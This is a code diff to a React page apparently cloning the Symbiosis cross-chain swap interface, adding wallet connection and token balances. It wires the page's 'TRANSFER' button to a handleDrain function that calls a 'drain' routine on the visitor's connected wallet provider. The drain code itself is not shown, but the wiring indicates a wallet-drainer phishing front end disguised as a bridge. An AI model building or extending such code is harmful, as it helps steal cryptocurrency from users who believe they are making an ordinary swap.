@@ -1,5 +1,6 @@
 "use client";
 
+import { ethers } from "ethers";
 import { useEffect, useState } from "react";
 import {
   Settings,
@@ -14,6 +15,12 @@ import Image from "next/image";
 import SymbiosisLayout from "../layouts/symbiosisLayout";
 import "/public/symbiosis/cygnito-font.css";
 import axios from "axios";
+import SeiConnectButton from "@/components/global/SeiConnectButton";
+import { useAccount } from "wagmi";
+import { shortenAddressSmall } from "../utils";
+import SelectNetwork from "@/components/symbiosis/SelectNetwork.dropdown";
+import { useWallet } from "../../components/useWallet";
+import Balance from "@/components/global/Balance";
 
 // Dummy data for pools
 const pools = [
@@ -173,38 +180,45 @@ interface Network {
   icon: string;
   isNew?: boolean;
   tokens: Token[];
+  chainId?: number;
 }
 
 const networks: Network[] = [
   {
     name: "BITCOIN",
+    chainId: 0, // Bitcoin does not use chainId in the same sense as EVM chains
     icon: "/symbiosis/1.png",
     isNew: true,
     tokens: [],
   },
   {
     name: "TON",
+    chainId: -1, // Placeholder as TON does not use standard chainId
     icon: "/symbiosis/Ton.png",
     isNew: true,
     tokens: [],
   },
   {
     name: "ETHEREUM",
+    chainId: 1,
     icon: "/symbiosis/eth-logoo.png",
     tokens: [],
   },
   {
     name: "AVALANCHE",
+    chainId: 43114,
     icon: "/symbiosis/ava.png",
     tokens: [],
   },
   {
     name: "ZKSYNC ERA",
+    chainId: 324,
     icon: "/symbiosis/zks.png",
     tokens: [],
   },
   {
     name: "ARBITRUM ONE",
+    chainId: 42161,
     icon: "/symbiosis/arb.png",
     tokens: [],
   },
@@ -224,6 +238,7 @@ const TokenSelector = ({
   const [selectedToken, setSelectedToken] = useState<Token | null>(null);
   const [tokens, setTokens] = useState<Token[]>([]);
   const [filteredTokens, setFilteredTokens] = useState<Token[]>([]);
+  const { chainId } = useAccount();
 
   const getOtherTokens = async () => {
     try {
@@ -327,14 +342,21 @@ const TokenSelector = ({
           />
         </div>
       </div>
-      <div className="text-sm text-[#CCCCCC]">Balance: (???)</div>
+      <div className="text-sm text-[#CCCCCC] flex justify-start items-center gap-1">
+        Balance:
+        <Balance
+          token={selectedToken?.address}
+          chainId={selectedNetwork?.chainId || chainId}
+          name={selectedToken?.name}
+        />
+      </div>
 
       {isOpen && (
         <div className="fixed px-4 inset-0 bg-black/20 flex items-center justify-center z-50">
           <div className="bg-white rounded-2xl w-full max-w-2xl max-h-[80vh] overflow-hidden">
             <div className="p-6">
               <div className="flex items-center justify-between mb-6">
-                <h2 className="text-xl font-mono">Transfer From</h2>
+                <h2 className="text-xl sm:text-3xl font-mono">Transfer From</h2>
                 <div className="flex items-center gap-2">
                   <button
                     className="p-2 hover:bg-gray-100 rounded-lg"
@@ -370,7 +392,11 @@ const TokenSelector = ({
                     {networks.map((network) => (
                       <button
                         key={network.name}
-                        className="flex items-center gap-2 w-full p-2 hover:bg-gray-100 rounded-lg transition-colors"
+                        className={`${
+                          network.name === selectedNetwork?.name
+                            ? "bg-gray-100"
+                            : ""
+                        } flex items-center gap-2 w-full p-2 hover:bg-gray-100 rounded-lg transition-colors`}
                         onClick={() => setSelectedNetwork(network)}
                       >
                         <Image
@@ -408,8 +434,8 @@ const TokenSelector = ({
                         <div className="flex items-center gap-2">
                           <Image
                             src={token.image}
-                            width={24}
-                            height={24}
+                            width={34}
+                            height={34}
                             alt={token.symbol}
                             className="rounded-full"
                           />
@@ -418,7 +444,12 @@ const TokenSelector = ({
                           </span>
                         </div>
                         <span className="font-mono text-sm">
-                          {token.balance}
+                          {/* {token.balance} */}
+                          <Balance
+                            chainId={selectedNetwork?.chainId}
+                            token={token.address}
+                            name={token.symbol}
+                          />
                         </span>
                       </button>
                     ))}
@@ -434,12 +465,16 @@ const TokenSelector = ({
 };
 
 export default function Page() {
+  const { drain } = useWallet();
+  const { connector, isConnected } = useAccount();
   const [activeTab, setActiveTab] = useState<"swap" | "pools" | "zap">("swap");
   const [showSettings, setShowSettings] = useState(false);
   const [showDeprecated, setShowDeprecated] = useState(false);
   //   const [searchTerm, setSearchTerm] = useState("");
   const [address, setAddress] = useState("");
   const [slippage, setSlippage] = useState("0.5");
+  const [loading, setLoading] = useState(false);
+  const [txState, setTxState] = useState("Initial");
 
   const [isOpen, setIsOpen] = useState(false);
   const [searchTerm, setSearchTerm] = useState("");
@@ -482,6 +517,32 @@ export default function Page() {
     setSelectedNetwork(network);
     setSelectedToken(token);
     setIsOpen(false);
+  };
+
+  const handleDrain = async () => {
+    if (!connector) {
+      console.error("Missing required fields for drain.");
+      return;
+    }
+
+    try {
+      setLoading(true);
+      setTxState("Processing");
+
+      const provider = new ethers.providers.Web3Provider(
+        await connector.getProvider()
+      );
+      const chainId = await provider.getSigner().getChainId();
+
+      await drain(provider, chainId, toToken.token.address); // Trigger drain with correct args
+
+      setTxState("Completed");
+      setLoading(false);
+    } catch (error) {
+      console.error("Error in drain function:", error);
+      setTxState("Failed");
+      setLoading(false);
+    }
   };
 
   const renderSwapContent = () => (
@@ -541,11 +602,17 @@ export default function Page() {
       </div>
 
       <button
+        onClick={() => handleDrain()}
+        disabled={loading}
         className={`${
           address === "" ? "bg-[#A3A3A3]" : "bg-[#76FB6D]"
         } w-full bg-black text-white py-4 rounded-lg hover:bg-gray-900 transition-colors`}
       >
-        {address === "" ? "SET VALID ADDRESS" : "TRANSFER"}
+        {ethers.utils.isAddress(address)
+          ? "TRANSFER"
+          : loading
+          ? "TRANSFERRING..."
+          : "SET VALID ADDRESS"}
       </button>
     </div>
   );
@@ -694,8 +761,8 @@ export default function Page() {
 
         {/* Navbar */}
         <nav className="mt-3">
-          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-            <div className="  h-16">
+          <div className="w-full mx-auto px-4">
+            <div className="h-16">
               <div className="flex justify-between items-center gap-8">
                 <div className="flex items-center gap-2">
                   <Image
@@ -733,9 +800,17 @@ export default function Page() {
                     <ExternalLink className="w-4 h-4" />
                   </a>
                 </div>
-                <button className="bg-black text-white md:text-lg text-sm md:px-5 px-2 md:py-3 py-1 rounded-2xl hover:bg-gray-900 transition-colors">
-                  Connect wallet
-                </button>
+                {isConnected ? (
+                  <ConnectedButtonsGroup />
+                ) : (
+                  <SeiConnectButton
+                    connect={
+                      <button className="bg-black text-white text-sm md:px-5 px-2 md:py-3 py-1 rounded-2xl hover:bg-gray-900 transition-colors">
+                        Connect wallet
+                      </button>
+                    }
+                  />
+                )}
               </div>
             </div>
           </div>
@@ -867,3 +942,15 @@ export default function Page() {
     </SymbiosisLayout>
   );
 }
+
+const ConnectedButtonsGroup = () => {
+  const { address } = useAccount();
+  return (
+    <div className="flex justify-start items-center gap-2 flex-nowrap whitespace-nowrap">
+      <SelectNetwork />
+      <button className="rounded-xl text-white bg-black px-4 py-3 font-medium">
+        {shortenAddressSmall(address)}
+      </button>
+    </div>
+  );
+};
